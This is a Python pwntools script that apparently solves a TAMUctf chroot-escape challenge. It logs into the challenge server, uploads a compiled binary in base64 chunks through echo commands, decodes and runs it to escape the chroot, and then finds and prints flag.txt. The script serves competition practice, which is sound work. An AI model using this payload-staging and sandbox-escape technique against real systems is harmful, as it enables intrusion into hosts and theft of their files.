#!/usr/bin/env python3

import os
import base64
from pwn import *

payload = []

# Compile the payload binary
if os.system("musl-gcc -static payload.c"):
    exit(1)

# Convert the payload into base64 and split
# it into small pieces
with open("a.out", "rb") as p:
    e = base64.b64encode(p.read())
    i = 0
    s = 150
    while not payload or payload[-1]:
        payload.append(e[i*s:(i+1)*s])
        i += 1
    
payload = payload[:-1]

# Login
conn = remote("challenges.tamuctf.com", 4353)
conn.recvuntil(b": ")
conn.send(b"2ff6b0b9733a294cb0e0aeb7269dea5ae05d2a2de569e8464b5967c6c207548e\n")

# Upload the binary to the server
p = log.progress("")
p.status('Uploading payload')
for i in payload:
    conn.recvuntil(b"#")
    conn.send(b"echo '" + i + b"' >> x.b64\n")
p.success('Executing payload')

conn.recvuntil(b"#")
conn.send(b"base64 -d x.b64 > x\n")

conn.recvuntil(b"#")
conn.send(b"chmod +x ./x\n")

# Execute chroot escape
conn.recvuntil(b"#")
conn.send(b"./x\n")

# Get the flag
log.info("Finding flag")
conn.recvuntil(b"#")
conn.send(b"find / -name flag.txt -print -quit | xargs cat\n")

conn.recvline()
print(conn.recvline().decode("ascii", "strict"))
conn.close()
